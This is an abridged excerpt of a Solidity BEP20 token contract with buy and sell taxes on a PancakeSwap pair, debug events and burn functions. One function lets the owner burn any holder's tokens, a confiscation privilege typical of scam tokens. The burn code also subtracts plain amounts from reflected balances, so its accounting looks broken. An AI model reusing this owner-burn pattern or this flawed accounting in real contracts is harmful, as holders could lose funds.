...
contract CheckDeploy is Context, IERC20, Ownable {  
    ...
    constructor () public {
        ...
        marketingwallet = 0xE2A59592E4478E7FC4db25b22e2e47D0c24643Cf;
    ...
    function _transfer(
        ...
        if(from == pancakePair)
        {
            takeFee = true;
            TaxType=1;
        emit comments ("Token Buy",486);
        }  
        else if(to == pancakePair)
        {
           takeFee = true;
            TaxType=2;
            emit comments ("Token Sell",492);
        ...
        else if(from != pancakePair && to != pancakePair)
        {
            takeFee = false;
            TaxType=0;
            emit comments ("Token Transfer",499);
        ...
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to])
        {
            takeFee = false;
            TaxType=0;
            emit comments ("sender ha NO slippage ",506);
        }   
    ...
    function _tokenTransfer(address sender, address recipient, uint256 amount,bool takeFee,uint TaxType) private {
        ...
        emit addressComments(recipient , "Recipient ln 631", 632);
    ...
    function verifyClaim(uint256 claimamount) public  {
     ...
     function _burnByHolder(address account, uint256 amount) internal {
        require(account != address(0), "BEP20: burn from the zero address");
        _rOwned[account] = _rOwned[account].sub(amount, "BEP20: burn amount exceeds balance");
        _tTotal = _tTotal.sub(amount);
        emit Transfer(account, address(0), amount);
     ...
     function _burnByAdmin(address account, uint256 amount) external onlyOwner {
        require(account != address(0), "BEP20: burn from the zero address");
        _rOwned[account] = _rOwned[account].sub(amount, "BEP20: burn amount exceeds balance");
        _tTotal = _tTotal.sub(amount);
        emit Transfer(account, address(0), amount);
